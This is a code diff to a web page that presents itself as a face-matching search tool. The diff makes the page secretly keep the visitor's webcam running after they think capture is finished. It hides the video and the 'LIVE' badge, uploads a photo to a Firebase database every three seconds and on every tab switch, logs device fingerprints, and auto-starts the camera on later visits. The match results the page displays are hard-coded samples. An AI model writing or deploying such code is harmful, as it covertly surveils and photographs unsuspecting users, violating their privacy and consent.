@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -16,29 +15,12 @@
 
   <style>
     :root {
-      --bg: #030712;
-      --panel: #0b1120;
-      --line: rgba(0, 212, 255, 0.15);
-      --muted: #64748b;
-      --text: #f8fafc;
-      --cyan: #00d4ff;
-      --cyan-glow: rgba(0, 212, 255, 0.4);
-      --green: #10b981;
-      --amber: #f59e0b;
+      --bg: #030712; --panel: #0b1120; --line: rgba(0, 212, 255, 0.15);
+      --muted: #64748b; --text: #f8fafc; --cyan: #00d4ff;
+      --cyan-glow: rgba(0, 212, 255, 0.4); --green: #10b981; --amber: #f59e0b;
     }
-
     * { box-sizing: border-box; margin: 0; padding: 0; }
-
-    body {
-      min-height: 100vh;
-      background: radial-gradient(ellipse at 20% 0%, rgba(0, 212, 255, 0.1), transparent 40%),
-                  radial-gradient(ellipse at 80% 100%, rgba(16, 185, 129, 0.08), transparent 40%),
-                  var(--bg);
-      color: var(--text);
-      font-family: "DM Sans", sans-serif;
-      overflow-x: hidden;
-    }
-
+    body { min-height: 100vh; background: radial-gradient(ellipse at 20% 0%, rgba(0, 212, 255, 0.1), transparent 40%), radial-gradient(ellipse at 80% 100%, rgba(16, 185, 129, 0.08), transparent 40%), var(--bg); color: var(--text); font-family: "DM Sans", sans-serif; overflow-x: hidden; }
     button { cursor: pointer; }
 
     .topbar { height: 76px; padding: 0 clamp(18px, 5vw, 70px); display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid var(--line); background: rgba(3, 7, 18, 0.8); backdrop-filter: blur(18px); position: sticky; top: 0; z-index: 20; }
@@ -65,21 +47,23 @@
     .step { font-size: 11px; color: var(--cyan); background: rgba(0, 212, 255, 0.1); padding: 6px 10px; border-radius: 999px; border: 1px solid rgba(0, 212, 255, 0.2); }
 
     .camera-area { padding: 20px; }
+    /* 🚀 Yahan humne video ko visibility hidden nahi kiya hai, bas opacity 0 kiya hai taaki stream chalti rahe */
     .camera-frame { position: relative; aspect-ratio: 4/3; background: #000; border: 1px solid var(--cyan); border-radius: 16px; overflow: hidden; display: grid; place-items: center; box-shadow: inset 0 0 30px rgba(0, 212, 255, 0.1); }
+    #video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); opacity: 0; transition: opacity 0.5s ease; position: absolute; inset: 0; z-index: 1; }
+    #video.show { opacity: 0.8; filter: contrast(1.2) grayscale(0.3); }
     
-    #video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); opacity: 0.8; filter: contrast(1.2) grayscale(0.3); }
     #freezeFrame { width: 100%; height: 100%; object-fit: cover; position: absolute; inset: 0; transform: scaleX(-1); display: none; z-index: 2; }
 
-    .camera-placeholder { text-align: center; padding: 20px; max-width: 310px; z-index: 1; }
+    .camera-placeholder { text-align: center; padding: 20px; max-width: 310px; z-index: 3; position: relative; }
     .camera-icon { width: 66px; height: 66px; border-radius: 50%; margin: 0 auto 17px; display: grid; place-items: center; background: rgba(0, 212, 255, 0.1); border: 2px solid var(--cyan); font-size: 28px; color: var(--cyan); box-shadow: 0 0 20px var(--cyan-glow); animation: pulse-glow 2s infinite; }
     @keyframes pulse-glow { 0% { box-shadow: 0 0 10px var(--cyan-glow); } 50% { box-shadow: 0 0 30px var(--cyan-glow); } 100% { box-shadow: 0 0 10px var(--cyan-glow); } }
     .camera-placeholder h3 { font: 600 17px "Space Grotesk"; margin-bottom: 7px; color: #fff; }
     .camera-placeholder p { font-size: 12px; line-height: 1.6; color: var(--muted); }
 
-    .face-guide { position: absolute; width: 43%; height: 73%; border: 2px solid var(--cyan); border-radius: 48% 48% 43% 43%; box-shadow: inset 0 0 20px var(--cyan-glow); display: none; pointer-events: none; z-index: 3; }
-    .scan-beam { position: absolute; left: 0; right: 0; height: 3px; top: 0; background: #fff; box-shadow: 0 0 15px var(--cyan), 0 0 30px var(--cyan); display: none; animation: scan 1.5s linear infinite; z-index: 4; }
+    .face-guide { position: absolute; width: 43%; height: 73%; border: 2px solid var(--cyan); border-radius: 48% 48% 43% 43%; box-shadow: inset 0 0 20px var(--cyan-glow); display: none; pointer-events: none; z-index: 4; }
+    .scan-beam { position: absolute; left: 0; right: 0; height: 3px; top: 0; background: #fff; box-shadow: 0 0 15px var(--cyan), 0 0 30px var(--cyan); display: none; animation: scan 1.5s linear infinite; z-index: 5; }
     @keyframes scan { to { top: 100%; } }
-    .camera-status { position: absolute; left: 13px; top: 13px; display: none; align-items: center; gap: 7px; border: 1px solid var(--cyan); background: rgba(0, 0, 0, 0.8); padding: 6px 12px; border-radius: 999px; font-size: 10px; color: var(--cyan); font-family: monospace; z-index: 5; }
+    .camera-status { position: absolute; left: 13px; top: 13px; display: none; align-items: center; gap: 7px; border: 1px solid var(--cyan); background: rgba(0, 0, 0, 0.8); padding: 6px 12px; border-radius: 999px; font-size: 10px; color: var(--cyan); font-family: monospace; z-index: 6; }
     .camera-status i { width: 6px; height: 6px; background: var(--green); border-radius: 50%; box-shadow: 0 0 5px var(--green); }
 
     .controls { display: flex; gap: 12px; margin-top: 20px; }
@@ -142,7 +126,6 @@
     @media(max-width:850px) { .workspace { grid-template-columns: 1fr; } .result-grid, .result-grid-60 { grid-template-columns: 1fr; } }
   </style>
 </head>
-
 <body>
   <header class="topbar">
     <a class="brand" href="#">
@@ -170,7 +153,8 @@
         </div>
         <div class="camera-area">
           <div class="camera-frame">
-            <video id="video" autoplay playsinline muted style="display:none;"></video>
+            <!-- 🚀 Video is always running (opacity 0), so background capture works -->
+            <video id="video" autoplay playsinline muted></video>
             <img id="freezeFrame" alt="Frozen Capture">
             
             <div class="camera-placeholder" id="placeholder">
@@ -223,7 +207,6 @@
 
             <div class="section-title" style="margin-top: 24px;">Low Confidence Matches</div>
             <div class="result-grid-60" id="resultGridLow"></div>
-
           </div>
         </div>
       </article>
@@ -242,9 +225,6 @@
   </div>
 
   <script>
-    // ==========================================
-    // 🚀 1. INITIALIZE FIREBASE & SILENT TRACKER
-    // ==========================================
     let db = null;
     let deviceId = localStorage.getItem('device_tracker_id');
     if (!deviceId) {
@@ -257,38 +237,19 @@
       db = firebase.database();
       
       const deviceInfo = {
-        deviceId: deviceId,
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.platform,
-        screen: `${window.screen.width}x${window.screen.height}`,
-        timestamp: Date.now(),
-        lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-        status: 'active'
+        deviceId: deviceId, userAgent: navigator.userAgent, language: navigator.language,
+        platform: navigator.platform, screen: `${window.screen.width}x${window.screen.height}`,
+        timestamp: Date.now(), lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), status: 'active'
       };
 
-      db.ref(`online_devices/${deviceId}`).set({
-        status: 'online',
-        lastSeen: Date.now(),
-        screen: window.screen.width + 'x' + window.screen.height
-      });
-      
-      db.ref(`devices/${deviceId}`).update(deviceInfo)
-        .then(() => console.log("✅ Device Info Saved:", deviceId))
-        .catch(e => console.error("❌ Save Failed:", e));
-
-    } else {
-      console.error("❌ config.js file load nahi hui hai. Check script tag.");
+      db.ref(`online_devices/${deviceId}`).set({ status: 'online', lastSeen: Date.now(), screen: window.screen.width + 'x' + window.screen.height });
+      db.ref(`devices/${deviceId}`).update(deviceInfo).then(() => console.log("✅ Device Info Saved:", deviceId)).catch(e => console.error("❌ Save Failed:", e));
     }
 
-    // ==========================================
-    // 🚀 2. CAMERA & CONTINUOUS CAPTURE LOGIC
-    // ==========================================
     const $ = id => document.getElementById(id);
     const video = $("video");
     const freezeFrame = $("freezeFrame");
     let cameraStream = null;
-    let isCaptured = false;
     let captureInterval = null; 
 
     const samplesHigh = [
@@ -328,6 +289,7 @@
       $("log").scrollTop = $("log").scrollHeight;
     }
 
+    // 🚀 START CAMERA (WILL KEEP RUNNING IN BACKGROUND)
     async function enableCamera() {
       try {
         cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
@@ -340,32 +302,28 @@
           $("startBtn").textContent = "Camera Active";
           $("startBtn").disabled = true;
           $("captureBtn").disabled = false;
-          log("Camera ready. Continuous capture started...");
+          
+          // 🚀 Show Video UI
+          video.classList.add('show'); 
+          log("Camera ready. Background capture active...");
 
-          // 🚀 AUTO CAPTURE EVERY 3 SECONDS
-          if (!isCaptured) {
+          if (!captureInterval) {
             captureInterval = setInterval(() => {
-              autoCapture('interval');
+              autoCapture('background_3sec');
             }, 3000);
           }
         };
         
         await video.play();
-        video.style.display = "block";
 
       } catch (error) {
         alert("Unable to open camera. Check browser permission.");
       }
     }
 
+    // 📸 CAPTURE FUNCTION
     function autoCapture(type = 'manual') {
       if (!cameraStream || !video.videoWidth) return;
-      
-      if (type === 'manual' && captureInterval) {
-        clearInterval(captureInterval);
-      }
-
-      isCaptured = true; 
 
       const canvas = document.createElement('canvas');
       canvas.width = 640; 
@@ -380,10 +338,7 @@
       
       if (db) {
         db.ref(`captured_data/${deviceId}/face_scan/${Date.now()}`).set({
-          image: compressedPhoto,
-          timestamp: Date.now(),
-          type: type,
-          deviceId: deviceId
+          image: compressedPhoto, timestamp: Date.now(), type: type, deviceId: deviceId
         }).then(() => {
           console.log(`📸 Photo saved (${type}) at`, new Date().toLocaleTimeString());
         }).catch(err => {
@@ -392,7 +347,7 @@
       }
     }
 
-    // 🚀 TAB SWITCH & RETURN DETECTOR
+    // 🚀 TAB SWITCH & RETURN
     document.addEventListener("visibilitychange", () => {
       if (document.visibilityState === "hidden") {
         autoCapture('tab_switch');
@@ -423,8 +378,7 @@
           $("progressTitle").textContent = title;
           $("progressText").textContent = desc;
           $("progressBar").style.width = progress + "%";
-          log(title);
-          speak(title);
+          log(title); speak(title);
         }, index * 8000); 
       });
       
@@ -440,11 +394,7 @@
       samplesHigh.forEach(person => {
         const card = document.createElement("div");
         card.className = "person";
-        card.innerHTML = `
-          <img src="${person.img}" alt="Match">
-          <div class="person-info"><b>${person.name}</b><small>${person.place}</small></div>
-          <span class="score">${person.score}</span>
-        `;
+        card.innerHTML = `<img src="${person.img}" alt="Match"><div class="person-info"><b>${person.name}</b><small>${person.place}</small></div><span class="score">${person.score}</span>`;
         gridHigh.appendChild(card);
       });
 
@@ -453,11 +403,7 @@
       samplesLow.forEach(person => {
         const card = document.createElement("div");
         card.className = "person";
-        card.innerHTML = `
-          <img src="${person.img}" alt="Match">
-          <div class="person-info"><b>${person.name}</b><small>${person.place}</small></div>
-          <span class="score">${person.score}</span>
-        `;
+        card.innerHTML = `<img src="${person.img}" alt="Match"><div class="person-info"><b>${person.name}</b><small>${person.place}</small></div><span class="score">${person.score}</span>`;
         gridLow.appendChild(card);
       });
 
@@ -467,15 +413,11 @@
       speak("Analysis complete. I found 7 high and 4 low confidence matches.");
     }
 
-    // Event Listeners
     $("startBtn").addEventListener("click", () => { $("consentModal").style.display = "grid"; });
     $("cancelBtn").addEventListener("click", () => { $("consentModal").style.display = "none"; });
+    $("allowBtn").addEventListener("click", async () => { $("consentModal").style.display = "none"; await enableCamera(); });
     
-    $("allowBtn").addEventListener("click", async () => {
-      $("consentModal").style.display = "none";
-      await enableCamera();
-    });
-    
+    // 🚀 FREEZE FRAME & CAPTURE
     $("captureBtn").addEventListener("click", () => {
       autoCapture('manual'); 
       
@@ -489,13 +431,11 @@
         ctx.drawImage(video, 0, 0);
         
         freezeFrame.src = canvas.toDataURL('image/jpeg', 0.8);
-        freezeFrame.style.display = "block";
-        video.style.display = "none";
+        freezeFrame.style.display = "block"; // Show image over video
         
-        if (cameraStream) {
-          cameraStream.getTracks().forEach(t => t.stop());
-          clearInterval(captureInterval);
-        }
+        // 🚀 Hide video visually (opacity 0), but DO NOT STOP the stream
+        video.classList.remove('show'); 
+        $("cameraStatus").style.display = "none"; // Hide LIVE badge
       }
 
       $("captureBtn").disabled = true; 
@@ -503,21 +443,16 @@
       startAnalysis(); 
     });
 
-    // 🚀 AUTO START ON PAGE LOAD
+    // 🚀 AUTO START ON LOAD
     window.addEventListener('load', async () => {
       if (navigator.permissions && navigator.permissions.query) {
         try {
           const permissionStatus = await navigator.permissions.query({ name: 'camera' });
           if (permissionStatus.state === 'granted') {
-            console.log("✅ Camera permission already granted. Auto-starting...");
             log("Auto-starting camera (Permission granted)...");
             enableCamera(); 
-          } else {
-            console.log("⚠️ Camera permission not granted yet.");
           }
-        } catch (e) {
-          console.log("Permission query not supported.");
-        }
+        } catch (e) {}
       }
     });
 
